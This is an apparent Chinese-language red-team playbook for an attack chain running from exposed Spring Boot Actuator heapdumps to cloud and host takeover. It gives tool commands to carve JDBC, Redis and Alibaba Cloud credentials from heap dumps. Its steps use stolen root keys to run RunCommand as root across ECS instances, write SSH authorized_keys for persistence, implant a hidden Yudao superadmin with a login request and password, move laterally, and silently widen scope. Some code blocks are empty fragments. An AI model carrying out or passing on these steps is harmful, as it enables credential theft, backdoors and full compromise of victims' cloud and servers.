# Spring Boot Actuator → 堆凭据 → 云/主机杀伤链

> **与 Gateway 链区分**：本链是业务 JAR 直暴露 `/actuator`（常含 `heapdump`），**不是** Spring Cloud Gateway 的 `refreshInRule` / SpEL 临时路由。  
> Gateway 专用见：`春府·关窍.md`。  
> Skill：`杀招/春府·开棺/SKILL.md`  
> 工具：`炼蛊房/actuator_probe.py` · `炼蛊房/heap_cred_scan.py`（正则 + 蓝鸟猎手对象图） · `炼蛊房/yudao_hidden_admin_sql.py`  
> 拆堆细则：`开棺·蓝鸟.md`

金标准案：`admnrlytlhub_20260805` · `bk_assets_20260806`

## 0. 授权与成功口径

- 目标已在 `授权范围`；从主站链发现的 API/ECS IP → `scope_expand` 静默并入。  
- **成功口径（按层）**：
  1. heapdump/env 抽出可验证凭据（JDBC / 云 AK / Redis）  
  2. 云：`GetCallerIdentity` 确认身份；或主机 shell/`whoami=root`  
  3. 业务：芋道/后台可登录超管（如 `syscache`）并能调敏感 API  

禁止：未授权第三方桶/账号；真 `DeleteInstance` 全集群（先问）；只扫 `health` 结案。

| 信号 | 含义 |

入口命令：

```bash

  --base https://业务API域名 \

```

若仅业务 Actuator → 继续本链。

## 2. 标准七步

### ① 定位真实 API 主机

H5 常在 Cloudflare；从 JS / XHR 找 `api.*` / `god.*` / `qy-test*` 等后端，对后端跑 probe。

### ② 确认 heapdump 规模（勿直接整包打爆带宽）

```bash
# probe 已含 HEAD + Range 1KB
# 大文件：分段 Range 落盘（可复用 tools/spring-gateway-killchain/bin/heapdump_range_fetch.py）
```

按 **IP + HOSTNAME + Content-Length** 分桶，禁止混节点合并。

### ③ 离线抽凭据

```bash
python3 炼蛊房/heap_cred_scan.py from-probe \
  --probe 案卷/.../案卷/actuator/probe.json \
  --dump-dir 案卷/.../案卷/heapdump \
  --out 案卷/.../接管/heap_creds --case <案>
# 已有本地堆：
python3 炼蛊房/heap_cred_scan.py \
  案卷/.../案卷/heapdump/heapdump_nodeA.hprof \
  --out 案卷/.../接管/heap_creds/ --case <案>
```

有 Java 时同一命令会跑蓝鸟 17 只蜘蛛（Spring DS / Druid / Redis / Shiro 钥 / env）。不要只扫 `LTAI` 就停。细则：`开棺·蓝鸟.md`。

优先验证：

1. `LTAI5t…` → 阿里云 SDK `GetCallerIdentity`（Root vs RAM）  
2. `jdbc:mysql://…` → 公网/内网连通性  
3. Redis / Mongo URI  
4. UTF-16 窗口里的 `AccessKey` / 口令串（Java 堆常见）

### ④ 云控（AK 为账号 Root 时）

| 步 | API | 目的 |
|----|-----|------|
| A | `GetCallerIdentity` | 确认 Root/RAM |
| B | `DescribeInstances` 多地域 | 枚举 ECS |
| C | Cloud Assistant `RunCommand` | **不必先破 SSH:22** |
| D | 写 `authorized_keys` | SSH 持久化 |
| E | 本机 `mysql.sock` harvest | 库口令 / yaml / 第三方 AK |

`admnr`：31→32 台 RunCommand root。证据：`接管/aliyun/control/`。

### ⑤ 主机 RCE 变体（无云 Root 时）

`bk_assets`：heapdump → 超管会话 → **文件上传路径穿越写 SSH key**（CVE-2025-2707 类）→ `root@<授权主机>`。  
链文：`接管/deep/rce_ssh/CHAIN_ACTUATOR_TO_SSH.md`。

### ⑥ 芋道隐藏超管

```bash
python3 炼蛊房/yudao_hidden_admin_sql.py \
  --db <库名> --tenant 201 --user syscache \
  --out 案卷/.../接管/yudao_implant.sql
```

在目标机对本机 MySQL 执行；登录：

```http
POST /admin-api/system/auth/login
tenant-id: 201
{"username":"syscache","password":"Sc@2026#xk"}
```

金标准口令可复用；以案卷 `HIDDEN_SUPERADMIN.json` 为准。批量盘探针约 33/35。

### ⑦ 横向与固化

- 配置/OSS/`infra_file_config` 再挖旁支 AK（tradea / shuadan…）  
- `scope_expand` 并入 ECS 公网 IP  
- STATUS + 复工报告；heapdump 大文件可外置，**凭据 JSON 必留**

```text

  ├─ gateway/routes 像 SCG → Gateway Playbook

  │     ├─ 云 Root AK → RunCommand 全控

  │     └─ 仅弱配置 → 字典后台 / Druid
  └─ 仅 health → 禁止结案；继续 mappings/env/旁路
```

## 5. 阴性 / 勿空转

- `health` UP 但其它端点 401/404 → 换 host / 内网 / Gateway 链  
- AK 仅 OSS 只读 → 仍列桶；勿假设 ECS  
- 纸面余额 ≠ 链上可提（Udun/ODA）→ 报告分开写  
- 报告里第三方 UAT 域名 **禁止**自动扩进 scope
